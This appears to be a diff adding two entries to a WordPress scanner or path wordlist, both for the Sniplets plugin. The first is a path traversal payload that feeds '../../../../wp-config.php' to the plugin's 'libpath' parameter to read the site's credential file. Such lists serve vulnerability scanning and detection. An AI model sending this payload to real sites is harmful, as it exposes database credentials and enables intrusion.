@@ -1,0 +1,2 @@
+/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
+/wp-content/plugins/sniplets/readme.txt
